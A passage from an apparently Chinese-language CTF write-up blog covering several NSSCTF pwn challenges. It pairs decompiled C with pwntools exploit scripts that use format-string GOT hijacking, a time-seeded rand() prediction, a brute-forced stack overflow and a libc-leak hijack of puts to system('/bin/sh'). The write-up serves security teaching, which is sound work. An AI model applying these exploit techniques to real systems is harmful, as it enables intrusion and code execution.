class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">double</span> v3; <span class="hljs-comment">// [esp-1Eh] [ebp-58h]</span><br>  <span class="hljs-type">char</span> format[<span class="hljs-number">50</span>]; <span class="hljs-comment">// [esp+0h] [ebp-3Ah] BYREF</span><br>  <span class="hljs-type">int</span> *p_argc; <span class="hljs-comment">// [esp+32h] [ebp-8h]</span><br><br>  p_argc = &amp;argc;<br>  signal(<span class="hljs-number">14</span>, exit_f);<br>  LODWORD(v3) = <span class="hljs-number">5</span>;<br>  isnan(v3);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello and welcome to \x1B[3mour\x1B[23m voting application!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;We noticed that there occured a slight buffer overflow in the previous version.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now we never return, so the problem should be solved? Right?&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Today you are the one who decides what we will vote about.\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Topic: &quot;</span>);<br>  fflush(<span class="hljs-built_in">stdin</span>);<br>  fflush(<span class="hljs-built_in">stdout</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%[^\n]%*c&quot;</span>, format);<br>  <span class="hljs-built_in">printf</span>(format);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nWill be the voting topic of today!&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<span class="hljs-comment">// main</span><br></code></pre></td></tr></table></figure><p>本题我提前将alarm函数改为了isnan，这是一种绕过反调试的方法，但偶尔可能不是这样用的，所以遇到alarm函数应该思考其是否是一种反调试手段。</p><p><code>__isoc99_scanf(&quot;%[^\n]%*c&quot;, format);</code>是一种读入字符串并排除了句尾’\n’的一种输入字符串方式，使用C语言编程的小伙伴可以学习一下这种写法。</p><p>很明显一个格式化字符串漏洞，由于没有其他内容了，如栈溢出等，其利用方法便仅有GOT劫持。GOT劫持就是修改GOT表中某一项的值，使PLT表在调用其对应的GOT表的时候跳转到被我们劫持后的地址。也就是我们其实需要修改的是执行格式化字符串漏洞之后的函数。</p><p>GOT表劫持我们一般会使用pwntools中的工具fmtstr_payload，这个函数的原型为<code>fmtstr_payload(offset, &#123;func_got : func0_addr , func1_got : func2_addr&#125;, numbwritten = 0, write_size = &#39;byte&#39;)</code>，offset为接下来准备测出的偏移，第二个参数为准备修改的函数的got表及其对应的希望劫持到的函数地址，numbwritten为已经输入的字符，默认为0，write_size为输入字节数，默认为byte字节型，这里还有short双字节和int四字节共三种选择。</p><p>第一次直接输入<code>AAAA.%p.%p.%p.%p.%p.%p.%p.%p</code>去测一下输入的偏移。<code>AAAA.0xffffd02e.(nil).0x8420812.0xa.0xffffd2ef.0xf7e0f679.0x4141a808.0x252e4141</code>咦？这不对吧？怎么没对齐？欸，此言差矣，这要是前面再多输入两个字符，后面少看两个字符，不就相当于形成了偏移为8的格式化字符串漏洞了吗，顺便迎合了接下来的fmtstr_payload的numbwritten考点。</p><p>那么EXP也直接端上来罢（急迫）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>io = process(<span class="hljs-string">&#x27;./VM&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./VM&#x27;</span>)<br>io.sendline(<span class="hljs-string">b&#x27;aa&#x27;</span> + fmtstr_payload(<span class="hljs-number">8</span>, &#123;elf.got[<span class="hljs-string">&#x27;exit&#x27;</span>]:elf.sym[<span class="hljs-string">&#x27;super_secret_function&#x27;</span>]&#125;, numbwritten = <span class="hljs-number">2</span>))<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h1><p>本题选自 HUBUCTF 2022 新生赛，无题目描述。题目链接：<a href="https://www.nssctf.cn/problem/2598">ez_pwn | NSSCTF</a>。</p><p>checksec：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">ubuntu@ubuntu:~/Desktop$ checksec ez_pwn<br>[*] <span class="hljs-string">&#x27;/home/ubuntu/Desktop/ez_pwn&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+4h] [rbp-8Ch] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+8h] [rbp-88h]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+Ch] [rbp-84h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> seed[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-80h]</span><br>  FILE *stream; <span class="hljs-comment">// [rsp+18h] [rbp-78h]</span><br>  <span class="hljs-type">char</span> v9[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-70h] BYREF</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-50h] BYREF</span><br>  __int64 v11; <span class="hljs-comment">// [rsp+48h] [rbp-48h]</span><br>  __int64 v12; <span class="hljs-comment">// [rsp+50h] [rbp-40h]</span><br>  __int64 v13; <span class="hljs-comment">// [rsp+58h] [rbp-38h]</span><br>  __int64 v14; <span class="hljs-comment">// [rsp+60h] [rbp-30h]</span><br>  __int64 v15; <span class="hljs-comment">// [rsp+68h] [rbp-28h]</span><br>  __int64 v16; <span class="hljs-comment">// [rsp+70h] [rbp-20h]</span><br>  __int64 v17; <span class="hljs-comment">// [rsp+78h] [rbp-18h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v18; <span class="hljs-comment">// [rsp+88h] [rbp-8h]</span><br><br>  v18 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  *(_QWORD *)seed = time(<span class="hljs-number">0LL</span>);<br>  *(_QWORD *)s = <span class="hljs-number">0LL</span>;<br>  v11 = <span class="hljs-number">0LL</span>;<br>  v12 = <span class="hljs-number">0LL</span>;<br>  v13 = <span class="hljs-number">0LL</span>;<br>  v14 = <span class="hljs-number">0LL</span>;<br>  v15 = <span class="hljs-number">0LL</span>;<br>  v16 = <span class="hljs-number">0LL</span>;<br>  v17 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Who goes there?&quot;</span>);<br>  gets(v9);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to my challenge, %s. No one has ever succeeded before. Will you be the first?\n&quot;</span>, v9);<br>  srand(seed[<span class="hljs-number">0</span>]);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">99</span>; ++i )<br>  &#123;<br>    v6 = rand() % <span class="hljs-number">100000</span> + <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I am thinking of a number from 1-100000. What is it?&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v4);<br>    <span class="hljs-keyword">if</span> ( v6 != v4 )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You have failed. Goodbye.&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Impressive.&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You&#x27;ve guessed all of my numbers. Here is your reward.&quot;</span>);<br>  stream = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( stream )<br>  &#123;<br>    fgets(s, <span class="hljs-number">50</span>, stream);<br>    <span class="hljs-built_in">puts</span>(s);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Goodbye.&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<span class="hljs-comment">// main</span><br></code></pre></td></tr></table></figure><p>我记得libc版本是不影响随机数生成的，seed取值只能是time(0)，种子随机，不能覆盖。v9的输入对任何内容都影响不了。</p><p>于是本题只能是使用利用相同time(0)拟相同取次数随机数并输入的方法。</p><p>需要利用的是ctypes库中的cdll包中的LoadLibrary函数去获取某位置的libc并利用srand和rand获取每次输入的值。</p><p>EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./ez_pwn&#x27;</span>)<br><br>libc = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>io.sendlineafter(<span class="hljs-string">b&#x27;there?\n&#x27;</span>, <span class="hljs-string">b&#x27;Nsus&#x27;</span>)<br><br>srand = libc.srand(libc.time(<span class="hljs-number">0</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    io.sendlineafter(<span class="hljs-string">b&#x27;it?\n&#x27;</span>, <span class="hljs-built_in">str</span>(libc.rand() % <span class="hljs-number">100000</span> + <span class="hljs-number">1</span>).encode())<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>注：<code>libc = cdll.LoadLibrary(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)</code>一句是使用本机libc作为exp使用libc。</p><h1 id="easystack"><a href="#easystack" class="headerlink" title="easystack"></a>easystack</h1><p>本题来源于 UUCTF 2022 新生赛，题目描述为“也许你的exp是对的呢？”。题目链接：<a href="https://www.nssctf.cn/problem/3092">easystack | NSSCTF</a>。</p><p>checksec：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">ubuntu@ubuntu:~/Desktop$ checksec easystack<br>[*] <span class="hljs-string">&#x27;/home/ubuntu/Desktop/easystack&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br></code></pre></td></tr></table></figure><p>main函数基本没什么用，一个setvbuf和fflush管缓冲区。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">256</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-100h] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I am back! Can you beat me this time?\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&#x27;s your name?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x10A</span>uLL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello, %s\n&quot;</span>, buf);<br>&#125;<span class="hljs-comment">// vuln</span><br></code></pre></td></tr></table></figure><p>因为输入字节不是很够，其实就很明显是栈溢出再加不知名pie看运气自行通了，不是很难，但这个脚本编写还是很有意思的，有Python编程想法的小伙伴可以尝试着学一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    io.sendline(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x108</span> + p16(<span class="hljs-number">0x196</span>)) <span class="hljs-comment">#可以为0x0196+x*0x100 (0&lt;=x&lt;=0xF)</span><br>    io.interactive()<br><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">try</span>:<br>        io = remote(<span class="hljs-string">&#x27;&#x27;</span>, )<br>        exp()<br>    <span class="hljs-keyword">except</span>:<br>        io.close()<br></code></pre></td></tr></table></figure><p>虽然不知道为什么在本机通不了，但在靶机上过了就行。</p><h1 id="Oil-Spill"><a href="#Oil-Spill" class="headerlink" title="Oil Spill"></a>Oil Spill</h1><p>本题来自 SDCTF 2022，题目描述为<code>This program will predict your future!Ubuntu 18.04</code>。题目链接：<a href="https://www.nssctf.cn/problem/2382">Oil Spill | NSSCTF</a>。</p><p>checksec：</p><p>注：我将文件名修改为了OSP，为了方便我自己进行修改、输入与调试。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">ubuntu@ubuntu:~/Desktop$ checksec OSP<br>[*] <span class="hljs-string">&#x27;/home/ubuntu/Desktop/OSP&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    No RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">312</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-140h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+148h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p, %p, %p, %p\n&quot;</span>, &amp;<span class="hljs-built_in">puts</span>, &amp;<span class="hljs-built_in">printf</span>, s, temp);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Oh no! We spilled oil everywhere and its making everything dirty&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;do you have any ideas of what we can use to clean it?&quot;</span>);<br>  fflush(<span class="hljs-built_in">stdout</span>);<br>  fgets(s, <span class="hljs-number">300</span>, <span class="hljs-built_in">stdin</span>);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-built_in">puts</span>(x);<br>  fflush(<span class="hljs-built_in">stdout</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<span class="hljs-comment">// main</span><br></code></pre></td></tr></table></figure><p>还是GOT劫持，顺便多了一个libc泄漏，给出了&amp;puts其实就已经很够用了。</p><p>因为本机使用的就是Ubuntu18.04，所以没再使用LibcSearcher，使用其实区别不大。用LibcSearcher和ret2libc3差不多，用dump dump出来。</p><p>这道题因为覆盖的内容更多，所以需要为fmtstr_payload提供文件的环境，如<code>context.binary=&#39;./OSP&#39;</code>让工具自行选择，或<code>context(os = &#39;linux&#39;, arch = &#39;amd64&#39;)</code>。</p><p>EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.binary = <span class="hljs-string">&#x27;./OSP&#x27;</span><br>io = process(<span class="hljs-string">&#x27;./OSP&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./OSP&#x27;</span>, <span class="hljs-literal">False</span>)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>puts_addr = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bsh_addr = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()<br><br>fmtstrstr = fmtstr_payload(<span class="hljs-number">8</span>, &#123;elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]:sys_addr, <span class="hljs-number">0x600C80</span>:<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>&#125;)<br>io.sendlineafter(<span class="hljs-string">b&#x27;it?\n&#x27;</span>, fmtstrstr)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="YDSneedGirlfriend"><a href="#YDSneedGirlfriend" class="headerlink" title="YDSneedGirlfriend"></a>YDSneedGirlfriend</h1><p>本题选自 BJDCTF 2020，题目描述为“Ubuntu16”。题目链接：<a href="https://www.nssctf.cn/problem/712">YDSneedGirlfriend | NSSCTF</a>。</p><p>checksec：</p><p>注：我将文件名修改为了gf，为了方便我自己进行修改、输入与调试。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">ubuntu@ubuntu:~/Desktop$ checksec gf<br>[*] <span class="hljs-string">&#x27;/home/ubuntu/Desktop/gf&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  myinit(argc, argv, envp);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      menu();<br>      read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4uLL</span>);<br>      v3 = atoi(buf);<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      del_girlfriend();<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">2</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">3</span> )<br>      &#123;<br>        print_girlfriend();<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4</span> )<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>LABEL_13:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid choice&quot;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">1</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_13;<br>      add_girlfriend();<br>    &#125;<br>  &#125;<br>&#125;<span class="hljs-comment">// main</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;------------------------&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; 1. Add a girlfriend    &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; 2. Delete a girlfriend &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; 3. show her name       &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; 4. give up             &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;------------------------&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your choice :&quot;</span>);<br>&#125;<span class="hljs-comment">// menu</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">add_girlfriend</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v0; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+Ch] [rbp-24h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( count &lt;= <span class="hljs-number">10</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !*(&amp;girlfriendlist + i) )<br>      &#123;<br>        *(&amp;girlfriendlist + i) = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>uLL);<br>        <span class="hljs-keyword">if</span> ( !*(&amp;girlfriendlist + i) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span 